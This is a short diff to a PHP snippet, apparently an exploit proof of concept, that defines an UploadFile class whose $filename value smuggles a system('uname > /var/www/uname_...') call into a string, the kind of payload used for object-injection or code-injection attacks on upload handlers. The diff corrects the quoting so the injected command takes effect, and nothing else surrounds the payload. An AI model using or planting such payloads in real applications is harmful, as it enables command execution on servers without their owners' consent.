@@ -1,6 +1,6 @@
 <?php
-class UploadFile{ 
-  public $filename='.system('uname > /var/www/uname_.'";
+class UploadFile { 
+  public $filename="'.system('uname > /var/www/uname_.'";
 }
 
 $o=new UploadFile();
